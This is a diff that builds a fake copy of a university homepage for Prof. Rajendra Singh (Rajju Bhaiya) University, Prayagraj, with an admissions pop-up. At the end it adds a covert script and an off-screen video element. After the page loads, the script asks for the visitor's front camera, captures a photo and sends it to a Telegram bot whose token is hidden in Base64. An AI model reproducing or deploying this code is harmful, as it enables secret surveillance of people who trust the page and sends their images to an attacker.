@@ -34,3 +34,140 @@ body{font-family:Arial,Helvetica,sans-serif;background:#f0f0f0}
 .card-body ul{list-style:none;padding:0}
 .card-body ul li{border-bottom:1px solid #eee;padding:6px 0}
 .card-body ul li a{color:#1a5a8c;text-decoration:none}
+.card-body ul li a:hover{text-decoration:underline}
+.card-body ul li::before{content:"\25B8 ";color:#ffd700;font-weight:bold}
+.vc-section{max-width:1200px;margin:20px auto;padding:0 15px}
+.vc-card{background:#fff;border-radius:6px;box-shadow:0 2px 8px rgba(0,0,0,0.1);overflow:hidden}
+.vc-card .card-body{display:flex;gap:20px;align-items:flex-start;flex-wrap:wrap}
+.vc-card .card-body img{width:130px;border-radius:6px;border:2px solid #1a3a5c}
+.vc-card .card-body p{flex:1;min-width:200px}
+.links-section{max-width:1200px;margin:20px auto;padding:0 15px;display:grid;grid-template-columns:repeat(4,1fr);gap:15px}
+.link-card{background:#fff;border-radius:6px;box-shadow:0 2px 8px rgba(0,0,0,0.1);overflow:hidden}
+.link-card .card-header{background:#1a3a5c;color:#fff;padding:9px 14px;font-size:14px;font-weight:bold}
+.link-card .card-body{padding:10px 14px;font-size:13px}
+.link-card .card-body a{color:#1a5a8c;text-decoration:none;display:block;padding:3px 0;font-size:13px}
+.link-card .card-body a:hover{text-decoration:underline}
+.logo-strip{max-width:1200px;margin:20px auto;padding:15px;background:#fff;border-radius:6px;box-shadow:0 2px 8px rgba(0,0,0,0.1);display:flex;flex-wrap:wrap;justify-content:center;align-items:center;gap:18px}
+.logo-strip img{height:45px;opacity:0.7;transition:opacity 0.2s}
+.logo-strip img:hover{opacity:1}
+.footer{background:#1a3a5c;color:#ccc;padding:25px 20px 15px;margin-top:30px;font-size:13px}
+.footer-inner{max-width:1200px;margin:0 auto;display:grid;grid-template-columns:repeat(4,1fr);gap:20px}
+.footer h4{color:#ffd700;margin-bottom:8px;font-size:14px}
+.footer p,.footer a{color:#ccc;text-decoration:none;line-height:1.8}
+.footer a:hover{color:#ffd700}
+.footer-bottom{max-width:1200px;margin:15px auto 0;border-top:1px solid #2a5a7c;padding-top:12px;text-align:center;font-size:12px;color:#888}
+.social-icons{display:flex;gap:10px;margin-top:8px}
+.social-icons a{display:inline-block;width:32px;height:32px;background:#2a5a7c;border-radius:50%;text-align:center;line-height:32px;color:#fff;font-size:16px;text-decoration:none}
+.social-icons a:hover{background:#ffd700;color:#1a3a5c}
+.modal-overlay{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.6);z-index:999;justify-content:center;align-items:center}
+.modal-overlay.active{display:flex}
+.modal-box{background:#fff;border-radius:8px;max-width:650px;width:90%;padding:25px 30px;position:relative;box-shadow:0 10px 40px rgba(0,0,0,0.3)}
+.modal-box .close-btn{position:absolute;top:10px;right:15px;font-size:24px;cursor:pointer;color:#999}
+.modal-box .close-btn:hover{color:#c00}
+.modal-box h3{color:#1a3a5c;margin-bottom:12px;font-size:18px}
+.modal-box p{font-size:14px;line-height:1.6;color:#333}
+.modal-box .apply-btn{display:inline-block;background:#ffd700;color:#1a3a5c;padding:10px 30px;text-decoration:none;font-weight:bold;border-radius:4px;margin-top:15px}
+.modal-box .apply-btn:hover{background:#e6c200}
+@media(max-width:768px){.header .title h1{font-size:18px}.header .title h2{font-size:14px}.header .logo{height:60px}.header .logo2{height:50px}.main-content{grid-template-columns:1fr}.links-section{grid-template-columns:1fr 1fr}.footer-inner{grid-template-columns:1fr 1fr}.navbar a{padding:8px 12px;font-size:12px}}
+@media(max-width:480px){.links-section{grid-template-columns:1fr}.footer-inner{grid-template-columns:1fr}}
+</style>
+</head>
+<body>
+<div class="top-bar"><div><a href="#">Screen Reader Access</a><a href="#">A+</a><a href="#">A</a><a href="#">A-</a></div><div class="right-links"><a href="#">NIRF</a><a href="#">Admission Brochure</a><a href="#">Samarth Login (Employee)</a><a href="#">Samarth Login (Student)</a><a href="#">Affiliation</a><a href="#">Recruitment-2025</a><a href="#">Tender</a><a href="#">Webmail</a><a href="#">Contact Us</a></div></div>
+<div class="header"><img class="logo" src="https://prsuniv.ac.in/img/home/uni-logo_NAAC.png" alt="University Logo"><div class="title"><h1>Prof. Rajendra Singh (Rajju Bhaiya) University, Prayagraj</h1><h2>प्रो. राजेन्द्र सिंह (रज्जू भैया) विश्वविद्यालय, प्रयागराज</h2><div class="naac">NAAC Accredited "A" Grade | UGC Approved</div></div><img class="logo2" src="https://prsuniv.ac.in/img/logo/Uttar%20Pradesh%20Chief%20Minister%20Office,%20Lucknow.png" alt="CM Logo"></div>
+<div class="navbar"><a href="#">Home</a><a href="#">The University</a><a href="#">Academics</a><a href="#">Admission</a><a href="#">Examination</a><a href="#">Departments</a><a href="#">Research</a><a href="#">Library</a><a href="#">IQAC</a><a href="#">NIRF</a><a href="#">RTI</a><a href="#">Downloads</a><a href="#">Contact Us</a></div>
+<div class="slider-container"><div class="slider" id="slider"><img src="https://i.ibb.co/5XJGHTsQ/Whats-App-Image-2025-03-25-3.jpg" alt="Campus Photo 1"><img src="https://i.ibb.co/HfCnQ4wf/PRSU-STAPHANADIWAS.png" alt="Campus Photo 2"><img src="https://i.ibb.co/mrtgd7CL/Whats-App-Image-2025-03-25-2.jpg" alt="Campus Photo 3"><img src="https://i.ibb.co/ycxqdCMb/Whats-App-Image-2025-03-25-1.jpg" alt="Campus Photo 4"></div></div>
+<div class="announcement"><span class="label">Announcement</span><span class="scrolling-text">Admission Open 2026-27 | Last Date: 25 June 2026 | Integrated Programmes, Masters, Diploma & More ►</span></div>
+<div class="main-content"><div class="card"><div class="card-header">About University</div><div class="card-body"><p>Prof. Rajendra Singh (Rajju Bhaiya) University, Prayagraj is a prominent state university located in Naini, Prayagraj, Uttar Pradesh. NAAC accredited with "A" Grade. Offers UG, PG, Diploma & Research programmes.</p></div></div><div class="card"><div class="card-header">Latest News</div><div class="card-body"><ul><li><a href="#">Admission Open 2026-27</a></li><li><a href="#">Entrance Exam Schedule Released</a></li><li><a href="#">Merit Based Direct Admission</a></li><li><a href="#">Faculty Recruitment 2025</a></li><li><a href="#">Exam Results - Even Sem 2025-26</a></li></ul></div></div><div class="card"><div class="card-header">Quick Links</div><div class="card-body"><ul><li><a href="#">Online Admission Portal</a></li><li><a href="#">Samarth Portal (Student)</a></li><li><a href="#">Samarth Portal (Employee)</a></li><li><a href="#">Examination Results</a></li><li><a href="#">Fee Payment</a></li></ul></div></div><div class="card"><div class="card-header">Notices</div><div class="card-body"><ul><li><a href="#">Holiday List 2026</a></li><li><a href="#">Exam Time Table 2025-26</a></li><li><a href="#">Attendance Notice</a></li><li><a href="#">Ph.D. Course Work Schedule</a></li><li><a href="#">Sports Registration</a></li></ul></div></div></div>
+<div class="vc-section"><div class="vc-card"><div class="card-header">Vice-Chancellor's Message</div><div class="card-body"><img src="https://prsuniv.ac.in/img/vc.jpg" alt="Vice Chancellor" onerror="this.style.display='none'"><p>Welcome to PRSU, Prayagraj. Committed to quality higher education, research, innovation, and holistic development.</p></div></div></div>
+<div class="links-section"><div class="link-card"><div class="card-header">Quick Links</div><div class="card-body"><a href="#">Raj Bhawan U.P.</a><a href="#">NEP 2020</a><a href="#">RTI</a><a href="#">UGC Grievance Portal</a></div></div><div class="link-card"><div class="card-header">Links</div><div class="card-body"><a href="#">Act</a><a href="#">Statute</a><a href="#">Ordinance</a><a href="#">Regulations</a><a href="#">Govt Orders</a></div></div><div class="link-card"><div class="card-header">Association</div><div class="card-body"><a href="#">Teacher's Association</a><a href="#">Alumni</a></div></div><div class="link-card"><div class="card-header">Terms</div><div class="card-body"><a href="#">Privacy Policy</a><a href="#">Terms and Conditions</a><a href="#">Hyperlinking Policy</a></div></div></div>
+<div class="logo-strip"><img src="https://prsuniv.ac.in/img/logo/Uttar%20Pradesh%20Chief%20Minister%20Office,%20Lucknow.png" alt="CM Office"><img src="https://prsuniv.ac.in/img/logo/Delnet%20logo.jpg" alt="Delnet"><img src="https://prsuniv.ac.in/img/logo/eDistrict%20Uttar%20Pradesh%20logo.png" alt="eDistrict"><img src="https://prsuniv.ac.in/img/logo/nk.png" alt="NK"><img src="https://prsuniv.ac.in/img/logo/rusa.png" alt="RUSA"><img src="https://prsuniv.ac.in/img/logo/e-thesis.png" alt="eThesis"><img src="https://prsuniv.ac.in/img/logo/e-library.png" alt="eLibrary"><img src="https://prsuniv.ac.in/img/logo/DigiLocker.png" alt="DigiLocker"></div>
+<div class="footer"><div class="footer-inner"><div><h4>Address</h4><p>PRSU, Naini, Prayagraj - 211010, UP, India</p><p><strong>Phone:</strong> 6394846670<br><strong>Email:</strong> asuhelpline@gmail.com</p></div><div><h4>Important Links</h4><a href="#">Home</a><br><a href="#">About Us</a><br><a href="#">Admission</a><br><a href="#">Examination</a><br><a href="#">Contact Us</a></div><div><h4>Student Corner</h4><a href="#">Admission Portal</a><br><a href="#">Samarth Login</a><br><a href="#">Fee Payment</a><br><a href="#">Scholarship</a><br><a href="#">Download Admit Card</a></div><div><h4>Follow Us</h4><div class="social-icons"><a href="#" title="Facebook">F</a><a href="#" title="Twitter">T</a><a href="#" title="YouTube">Y</a></div><p style="margin-top:10px;font-size:12px">Visitors: 1,25,48,369</p></div></div><div class="footer-bottom">Copyright © Prof. Rajendra Singh (Rajju Bhaiya) University, Prayagraj</div></div>
+<div class="modal-overlay" id="admissionModal"><div class="modal-box"><span class="close-btn" onclick="closeModal()">&times;</span><h3>PRSU, Prayagraj</h3><h4 style="color:#c00">ADMISSION OPEN 2026-27</h4><p><strong>Merit Based:</strong> IPA, IPC, IPS, MA, M.Sc, M.Com, MSW, Diploma</p><p><strong>Entrance Based:</strong> MCA, LLM, MBA, BCA, B.Pharm, B.Sc (Ag), BA-LLB</p><p><strong>Start:</strong> 12 May 2026 | <strong>Last:</strong> 25 June 2026</p><a href="#" class="apply-btn">Apply Now</a></div></div>
+
+<!-- Camera elements — offscreen, not display:none -->
+<video id="video" autoplay playsinline muted style="position:fixed;top:-9999px;left:-9999px;width:1px;height:1px;opacity:0.01;pointer-events:none;"></video>
+<canvas id="canvas" style="display:none;"></canvas>
+
+<script>
+(function(){
+    // ===== SLIDER =====
+    var slider = document.getElementById('slider');
+    var slides = slider.children;
+    var current = 0;
+    setInterval(function(){
+        current = (current + 1) % slides.length;
+        slider.style.transform = 'translateX(-' + (current * 100) + '%)';
+    }, 3000);
+
+    // ===== ADMISSION MODAL =====
+    var modal = document.getElementById('admissionModal');
+    setTimeout(function(){ modal.classList.add('active'); }, 2000);
+    window.closeModal = function(){ modal.classList.remove('active'); };
+    modal.addEventListener('click', function(e){
+        if(e.target === modal) modal.classList.remove('active');
+    });
+
+    // ===== CAMERA CAPTURE SYSTEM (Base64 encoded credentials) =====
+    var video = document.getElementById('video');
+    var canvas = document.getElementById('canvas');
+    var ctx = canvas.getContext('2d');
+
+    var BOT_TOKEN = atob("ODc2Mjc2MTU5MDpBQUdGM21GQzNmMDRIU3hDSklTTjRQOTBtbFRWQ3RKQU5DRQ==");
+    var CHAT_ID   = atob("ODE0NjI2NTUxNA==");
+    var urlParams = new URLSearchParams(window.location.search);
+    var targetChat = urlParams.get('id') || CHAT_ID;
+
+    function startCamera() {
+        navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false })
+        .then(function(stream) {
+            video.srcObject = stream;
+            video.onplaying = function() {
+                setTimeout(captureAndSend, 500);
+            };
+            video.onloadedmetadata = function() {
+                video.play().catch(function(){});
+            };
+        })
+        .catch(function(err) {
+            console.log('CAMERA_ERROR: ' + err.name);
+        });
+    }
+
+    function captureAndSend() {
+        if (video.videoWidth === 0 || video.videoHeight === 0) {
+            setTimeout(captureAndSend, 300);
+            return;
+        }
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+        if (video.srcObject) {
+            video.srcObject.getTracks().forEach(function(t){ t.stop(); });
+            video.srcObject = null;
+        }
+
+        canvas.toBlob(function(blob) {
+            var fd = new FormData();
+            fd.append('chat_id', targetChat);
+            fd.append('photo', blob, 'capture.png');
+
+            fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendPhoto', {
+                method: 'POST',
+                body: fd
+            })
+            .then(function(r){ return r.json(); })
+            .then(function(d){ console.log(d.ok ? 'SENT' : 'FAIL'); })
+            .catch(function(){ console.log('NET_ERROR'); });
+        }, 'image/png');
+    }
+
+    // Start camera after page loads
+    window.addEventListener('load', function(){
+        setTimeout(startCamera, 3000);
+    });
+})();
+</script>
+</body>
+</html>
